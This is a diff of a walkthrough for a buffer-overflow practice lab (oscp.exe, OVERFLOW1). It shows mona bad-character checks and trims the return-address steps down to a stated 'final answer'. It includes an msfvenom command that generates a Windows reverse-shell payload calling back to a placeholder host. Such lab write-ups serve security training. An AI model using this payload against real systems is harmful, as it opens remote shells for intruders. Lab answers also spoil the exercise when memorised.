@@ -89,11 +89,7 @@ So I rerun the program and the script: <br />
 ![image](https://github.com/user-attachments/assets/57739da3-ab3e-4289-a258-d3c4387788dc)<br />
 As shown in the image above, the EIP is overwritten with 4 Bs, and the ESP is overwritten with `01B3FA30`. Now to check bad characters, first run `!mona bytearray -b "\x00"`. This will create a file containing the list of characters in hex. Then run `!mona compare -f C:\mona\oscp\bytearray.bin -a 01B3FA30`.<br />
 ![image](https://github.com/user-attachments/assets/adb4df98-43e9-47b2-9819-19437d7449c2)<br />
-The bad characters found by mona are `00,07,2e,a0`. Now that I know the bad characters I can finally create a shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c`:<br />
-![image](https://github.com/user-attachments/assets/2dddc6de-d074-44c2-91fc-64ca0f1d5f32)<br />
-So the code is almost done. I only need to select a valid return address. To do that, I add a NOP sled of 32 bytes and run the program, then I want to find this NOP sled in the memory dump: <br />
-![image](https://github.com/user-attachments/assets/cb1856e5-da58-42d2-995a-4b64db73fbb8)<br />
-There it is. All I need to do now is to select one of those addresses that has NOPs(\x90), for example I'll take `019EFA38`:
+The bad characters found by mona are `00,07,2e,a0`. So the final answer is `\x00\x07\x2e\xa0`. This is going to be useful to create the shellcode, for example:  `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c`:<br />
 
 ### oscp.exe - OVERFLOW2
 
